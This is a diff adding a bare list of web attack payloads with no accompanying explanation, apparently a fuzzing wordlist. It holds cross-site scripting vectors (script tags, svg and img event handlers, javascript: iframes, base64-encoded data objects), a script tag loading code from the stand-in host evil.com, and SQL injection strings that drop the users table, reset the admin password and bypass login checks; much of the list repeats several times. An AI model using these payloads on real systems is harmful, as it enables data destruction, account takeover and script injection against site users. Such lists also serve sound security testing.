@@ -1,0 +1,75 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<script src="http://evil.com/malicious.js"></script>
+'; DROP TABLE users;--
+'; UPDATE users SET password='123456' WHERE username='admin';--
+1' OR '1' = '1
+"><svg onload=alert(1)>
+"><img src=x onerror=alert(1)>
+"><iframe src="javascript:alert(1)">
+"><script>alert(String.fromCharCode(88,83,83))</script>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<script>alert(document.domain)</script>
+"><script>alert(document.domain)</script>
+<svg onload=alert(document.domain)>
+"><svg onload=alert(document.domain)>
+<iframe src="javascript:alert(document.domain)"></iframe>
+"><iframe src="javascript:alert(document.domain)"></iframe>
+"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+"><object type="text/x-scriptlet" data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<script>alert(window.location)</script>
+"><script>alert(window.location)</script>
+<svg onload=alert(window.location)>
+"><svg onload=alert(window.location)>
+<iframe src="javascript:alert(window.location)"></iframe>
+"><iframe src="javascript:alert(window.location)"></iframe>
+"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+"><object type="text/x-scriptlet" data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+"><body onload=alert(1)>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><iframe src="javascript:alert(1)">
+"><script>alert(String.fromCharCode(88,83,83))</script>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<script>alert(document.domain)</script>
+"><script>alert(document.domain)</script>
+<svg onload=alert(document.domain)>
+"><svg onload=alert(document.domain)>
+<iframe src="javascript:alert(document.domain)"></iframe>
+"><iframe src="javascript:alert(document.domain)"></iframe>
+"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+"><object type="text/x-scriptlet" data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<script>alert(window.location)</script>
+"><script>alert(window.location)</script>
+<svg onload=alert(window.location)>
+"><svg onload=alert(window.location)>
+<iframe src="javascript:alert(window.location)"></iframe>
+"><iframe src="javascript:alert(window.location)"></iframe>
+"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+"><object type="text/x-scriptlet" data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+"><body onload=alert(1)>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><iframe src="javascript:alert(1)">
+"><script>alert(String.fromCharCode(88,83,83))</script>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<script>alert(document.domain)</script>
+"><script>alert(document.domain)</script>
+<svg onload=alert(document.domain)>
+"><svg onload=alert(document.domain)>
+<iframe src="javascript:alert(document.domain)"></iframe>
+"><iframe src="javascript:alert(document.domain)"></iframe>
+"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+"><object type="text/x-scriptlet" data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<script>alert(window.location)</script>
+"><script>alert(window.location)</script>
+<svg onload=alert(window.location)>
+"><svg onload=alert(window.location)>
+<iframe src="javascript:alert(window.location)"></iframe>
+"><iframe src="javascript:alert(window.location)"></iframe>
+"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+"><object type="text/x-scriptlet" data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+"><body onload=alert(1)>
